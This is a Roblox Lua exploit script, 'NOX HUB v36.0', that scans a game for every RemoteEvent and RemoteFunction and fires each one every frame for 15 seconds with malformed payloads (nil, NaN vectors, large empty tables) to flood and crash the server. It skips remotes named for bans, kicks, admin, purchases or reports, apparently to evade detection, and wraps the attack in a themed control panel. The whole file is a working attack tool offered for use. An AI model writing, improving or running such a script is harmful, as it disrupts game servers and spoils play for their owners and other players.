--[[
    🔱 NOX HUB v36.0 [APOCALYPSE-NOW] 🔱
    "No more hiding. Total saturation."
    
    APOCALYPSE FEATURES:
    - [RELIABILITY FIX] : Simplified engine loop to ensure execution.
    - [CONSOLE LOGS] : Prints DEBUG info (F9) to confirm activity.
    - [TRINITY PAYLOAD] : Rotates between NaN, Nil, and Empty Table per frame.
    - [GLOBAL SCAN] : Aggressive scanner for ReplicatedStorage/Workspace/Players.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. APOCALYPSE ENGINE //
local Engine = {
    Active = false,
    Targets = {},
    Buffer = {} 
}

function Engine:Log(msg)
    warn("[NOX]: " .. tostring(msg))
end

function Engine:Scan()
    Engine.Log("Scanning world...")
    Engine.Targets = {}
    local count = 0
    
    local function check(v)
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            -- Standard Safelist
            if not (n:find("ban") or n:find("kick") or n:find("admin") or 
                    n:find("market") or n:find("purchase") or n:find("shop") or 
                    n:find("product") or n:find("asset") or n:find("prompt") or
                    n:find("devtools") or n:find("console") or n:find("debug") or
                    n:find("warn") or n:find("error") or n:find("report")) then
                 table.insert(Engine.Targets, v)
                 count = count + 1
            end
        end
    end

    for _, v in pairs(game:GetDescendants()) do check(v) end
    
    Engine.Log("Scan complete. Targets found: " .. count)
    return count
end

function Engine:Apocalypse(duration, updateCallback)
    if Engine.Active then 
        Engine.Log("Already active!")
        return 
    end
    Engine.Active = true
    Engine.Log("Initiating Apocalypse Protocol...")
    
    local count = Engine:Scan()
    
    if count == 0 then
        updateCallback(0, "NO TARGETS FOUND (CHECK CONSOLE)")
        Engine.Log("FAILURE: 0 Targets found.")
        Engine.Active = false
        return
    end
    
    -- PAYLOADS
    local NaN = Vector3.new(0/0, 0/0, 0/0)
    local PayloadNaN = {NaN, NaN, NaN}
    local PayloadTable = table.create(100, {})
    local PayloadNil = nil
    
    task.spawn(function()
        local StartTime = tick()
        local EndTime = StartTime + duration
        
        -- MAIN LOOP (Heartbeat)
        -- We process ALL targets every frame.
        local Connection
        Connection = RunService.Heartbeat:Connect(function()
            if not Engine.Active or tick() >= EndTime then
                Connection:Disconnect()
                return
            end
            
            -- GATLING FIRE
            -- We iterate all targets and fire 1 shot per frame per target
            for _, r in pairs(Engine.Targets) do
                pcall(function()
                    -- Rotate Attack
                    local mode = math.random(1, 3)
                    local p = PayloadNil
                    if mode == 2 then p = PayloadNaN end
                    if mode == 3 then p = PayloadTable end
                    
                    if r:IsA("RemoteEvent") then
                        r:FireServer(p)
                    elseif r:IsA("RemoteFunction") then
                        task.spawn(function() r:InvokeServer(p) end)
                    end
                end)
            end
        end)
        
        -- UI UPDATE LOOP
        while tick() < EndTime and Engine.Active do
            local remaining = math.ceil(EndTime - tick())
            updateCallback(remaining, "RAINING FIRE... ["..count.." TARGETS]")
            wait(1)
        end
        
        if Connection then Connection:Disconnect() end
        Engine.Active = false
        Engine.Log("Apocalypse finished.")
        updateCallback(duration, "SYSTEM COOLDOWN")
    end)
end

-- // 2. COMMAND CENTER UI (Apocalypse Theme) //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxCommand"
    pcall(function() Screen.Parent = CoreGui end)
    
    -- MAIN WINDOW
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 500, 0, 350)
    Main.Position = UDim2.new(0.5, -250, 0.5, -175)
    Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Metal Grey
    Main.BorderSizePixel = 2
    Main.BorderColor3 = Color3.fromRGB(150, 0, 0)
    Main.ClipsDescendants = true
    
    local Corner = Instance.new("UICorner", Main)
    Corner.CornerRadius = UDim.new(0, 4)
    
    local TopBar = Instance.new("Frame", Main)
    TopBar.Size = UDim2.new(1, 0, 0, 40)
    TopBar.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
    
    local Title = Instance.new("TextLabel", TopBar)
    Title.Text = "NOX APOCALYPSE v36.0"
    Title.Font = Enum.Font.SciFi
    Title.TextColor3 = Color3.fromRGB(255, 50, 50) 
    Title.TextSize = 18
    Title.Size = UDim2.new(0.5, 0, 1, 0)
    Title.Position = UDim2.new(0.05, 0, 0, 0)
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.BackgroundTransparency = 1
    
    -- TABS
    local Tabs = Instance.new("Frame", Main)
    Tabs.Size = UDim2.new(0.25, 0, 0.85, 0) 
    Tabs.Position = UDim2.new(0, 0, 0.15, 0)
    Tabs.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Tabs.BorderSizePixel = 0
    
    local function CreateTabBtn(text, order, callback)
        local btn = Instance.new("TextButton", Tabs)
        btn.Size = UDim2.new(1, 0, 0, 40)
        btn.Position = UDim2.new(0, 0, 0, (order-1)*40)
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(100, 100, 100)
        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        btn.Font = Enum.Font.SciFi
        btn.BorderSizePixel = 0
        
        btn.MouseButton1Click:Connect(function()
            for _, c in pairs(Tabs:GetChildren()) do if c:IsA("TextButton") then c.TextColor3 = Color3.fromRGB(100, 100, 100) c.BackgroundColor3 = Color3.fromRGB(20, 20, 20) end end
            btn.TextColor3 = Color3.fromRGB(255, 0, 0) 
            btn.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
            callback()
        end)
        return btn
    end
    
    -- CONTENT AREA
    local Content = Instance.new("Frame", Main)
    Content.Size = UDim2.new(0.75, 0, 0.85, 0)
    Content.Position = UDim2.new(0.25, 0, 0.15, 0)
    Content.BackgroundTransparency = 1
    
    -- PAGE 1: ATTACK
    local PageAttack = Instance.new("Frame", Content)
    PageAttack.Size = UDim2.new(1, 0, 1, 0)
    PageAttack.BackgroundTransparency = 1
    
    local StatusLbl = Instance.new("TextLabel", PageAttack)
    StatusLbl.Text = "TARGET ACQUIRED"
    StatusLbl.Size = UDim2.new(1, 0, 0, 30)
    StatusLbl.Position = UDim2.new(0, 0, 0.1, 0)
    StatusLbl.TextColor3 = Color3.fromRGB(200, 200, 200)
    StatusLbl.Font = Enum.Font.SciFi
    StatusLbl.BackgroundTransparency = 1
    
    local BufferBarBg = Instance.new("Frame", PageAttack)
    BufferBarBg.Size = UDim2.new(0.8, 0, 0.05, 0)
    BufferBarBg.Position = UDim2.new(0.1, 0, 0.3, 0)
    BufferBarBg.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
    
    local BufferBarFill = Instance.new("Frame", BufferBarBg)
    BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
    BufferBarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    
    local MainBtn = Instance.new("TextButton", PageAttack)
    MainBtn.Size = UDim2.new(0.6, 0, 0.2, 0)
    MainBtn.Position = UDim2.new(0.2, 0, 0.6, 0)
    MainBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    MainBtn.Text = "START APOCALYPSE (15s)"
    MainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    MainBtn.Font = Enum.Font.SciFi
    MainBtn.TextSize = 16
    local BtnCorner = Instance.new("UICorner", MainBtn)
    BtnCorner.CornerRadius = UDim.new(0, 4)
    local BtnStroke = Instance.new("UIStroke", MainBtn)
    BtnStroke.Color = Color3.fromRGB(255, 0, 0)
    
    MainBtn.MouseButton1Click:Connect(function()
        Engine.Log("Button Clicked!")
        if not Engine.Active then
            Engine:Apocalypse(15, function(timeLeft, txt)
                StatusLbl.Text = txt
                local progress = (15 - timeLeft) / 15
                BufferBarFill.Size = UDim2.new(progress, 0, 1, 0)
                
                if timeLeft == 0 then
                   MainBtn.Text = "START APOCALYPSE (15s)"
                   BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
                else
                   MainBtn.Text = "DESTRUCTION... " .. timeLeft
                end
            end)
        else
            Engine.Log("Ignored click: Engine already active.")
        end
    end)
    
    -- PAGE 2: VISUALS
    local PageVisuals = Instance.new("Frame", Content)
    PageVisuals.Size = UDim2.new(1, 0, 1, 0)
    PageVisuals.BackgroundTransparency = 1
    PageVisuals.Visible = false
    
    local GraphFrame = Instance.new("Frame", PageVisuals)
    GraphFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
    GraphFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
    GraphFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    GraphFrame.BorderColor3 = Color3.fromRGB(150, 0, 0)
    GraphFrame.BorderSizePixel = 1
    
    for i = 1, 40 do
        local bar = Instance.new("Frame", GraphFrame)
        bar.Size = UDim2.new(0.02, 0, math.random()*0.5, 0)
        bar.Position = UDim2.new((i-1)*0.025, 0, 1 - bar.Size.Y.Scale, 0)
        bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        bar.BorderSizePixel = 0
        task.spawn(function()
            while GraphFrame.Parent do
                local targetHeight = Engine.Active and math.random(0.5, 1) or math.random(0, 0.1)
                bar:TweenSize(UDim2.new(0.02, 0, targetHeight, 0), "Out", "Quad", 0.05, true)
                wait(0.05)
            end
        end)
    end

    -- TABS LOGIC
    CreateTabBtn("ATTACK", 1, function() PageAttack.Visible = true; PageVisuals.Visible = false end)
    CreateTabBtn("MONITOR", 2, function() PageAttack.Visible = false; PageVisuals.Visible = true end)
    
     -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
    
    Engine.Log("UI Created Successfully.")
end

Nox:CreateUI()
